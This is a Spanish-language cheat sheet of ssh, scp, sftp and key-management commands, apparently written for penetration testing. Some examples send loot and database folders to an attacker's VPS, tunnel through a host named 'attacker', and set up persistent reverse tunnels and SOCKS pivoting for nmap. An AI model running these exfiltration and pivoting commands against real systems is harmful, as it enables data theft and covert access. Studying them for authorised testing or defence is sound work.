# ssh

| Binario / Parámetro                         | Función                                   | Ejemplo de sintaxis                                                   |
| ------------------------------------------- | ----------------------------------------- | --------------------------------------------------------------------- |
| `-X`                                        | Muestra GUI remoto en el host             | `ssh -X user@192.168.1.100`                                           |
| `-fN`                                       | Tunneling en background                   | `ssh -fN -L 3389:192.168.1.10:3389 user@attacker`                     |
| `-D` 1080                                   | SOCKS5 proxy dinámico                     | `ssh -D 1080 user@vps` → `proxychains -q nmap ...`                    |
| `-R` 2222:localhost:22                      | Reverse tunnel (persistente)              | `ssh -R 2222:localhost:22 user@vps`                                   |
| `-L` (port-local):(ip_remota):(port-remoto) | Port forwarding                           | `ssh -L 8080:10.10.10.10:80 user@gateway`                             |
| `-J` user@jump                              | Jump host / ProxyJump                     | `ssh -J user@bastion user@internal`                                   |
| `-o` ProxyCommand                           | ProxyCommand + netcat (sin ssh en target) | `ssh -o ProxyCommand="nc -X connect -x proxy:8080 %h %p" user@target` |
| `-i` key `-o` PasswordAuthentication=no     | Solo clave, sin pass                      | `ssh -i id_rsa root@target`                                           |
| `ssh` user@host command                     | Ejecución remota one-liner                | `ssh user@10.10.10.10 whoami`                                         |

# scp

| Parámetro | Función               | Ejemplo                                      |
| --------- | --------------------- | -------------------------------------------- |
| `-r`      | Recursivo             | `scp -r /loot user@vps:~/`                   |
| `-P` port | Puerto distinto       | `scp -P 2222 file user@10.10.10.10:/tmp`     |
| `-i` key  | Clave específica      | `scp -i id_ed25519 bigfile root@target:/tmp` |
| `-C`      | Compresión habilitada | `scp -C -r database/ user@vps:~/`            |

# sftp

| Comando interno | Función                  | Ejemplo dentro de sftp session |
| --------------- | ------------------------ | ------------------------------ |
| `get -r` dir    | Descarga recursiva       | `get -r /var/www/html`         |
| `put -r` dir    | Subida recursiva         | `put -r loot/`                 |
| `lcd` /path     | Cambiar directorio local | `lcd /tmp`                     |
| `progress`      | Mostrar barra progreso   | `progress`                     |
# ssh-keygen
| Parámetro        | Función                      | Ejemplo                              |
| ---------------- | ---------------------------- | ------------------------------------ |
| `-t` ed25519/rsa | Tipo de clave                | `ssh-keygen -t ed25519 -C "pentest"` |
| `-b` 4096        | Bits (RSA)                   | `ssh-keygen -t rsa -b 4096`          |
| `-R` hostname    | Borrar del known_hosts       | `ssh-keygen -R 192.168.1.100`        |
| `-p`             | Cambiar passphrase existente | `ssh-keygen -p -f ~/.ssh/id_ed25519` |

# ssh-copy-id
| Parámetro | Función          | Ejemplo                                     |
| --------- | ---------------- | ------------------------------------------- |
| `-i` file | Clave específica | `ssh-copy-id -i id_ed25519.pub user@target` |
| `-p` port | Puerto distinto  | `ssh-copy-id -p 2222 user@10.10.10.10`      |

# ssh-agent & ssh-add
| Comando             | Función                 | Ejemplo                     |
| ------------------- | ----------------------- | --------------------------- |
| `eval` $(ssh-agent) | Iniciar agente          | `eval $(ssh-agent -s)`      |
| `ssh-add` key       | Añadir clave            | `ssh-add ~/.ssh/id_ed25519` |
| `ssh-add` -l        | Listar claves cargadas  | `ssh-add -l`                |
| `ssh-add` -D        | Borrar todas las claves | `ssh-add -D`                |
